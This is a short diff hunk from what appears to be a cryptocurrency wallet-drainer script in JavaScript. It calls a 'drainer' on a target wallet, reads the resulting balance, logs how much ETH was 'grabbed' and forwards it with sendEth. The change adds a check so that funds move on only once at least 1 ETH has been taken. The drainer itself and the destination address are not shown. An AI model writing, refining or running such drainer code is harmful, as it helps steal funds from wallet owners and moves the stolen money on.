@@ -26,8 +26,10 @@ async function runOnce() {
   drainer.drain(WALLET_ADDRESS, NUM_TRIALS);
   await delay(60 * 1000);  // 60 seconds
   balanceWei = await web3.eth.getBalance(walletAccount);
-  console.log('Grabbed ' + (balanceWei / 1e18) + ' ETH');
-  sendEth(balanceWei);
+  if (balanceWei >= 1e18) {
+    console.log('Grabbed ' + (balanceWei / 1e18) + ' ETH');
+    sendEth(balanceWei);
+  }
 }
 
 async function sendEth(amountWei) {
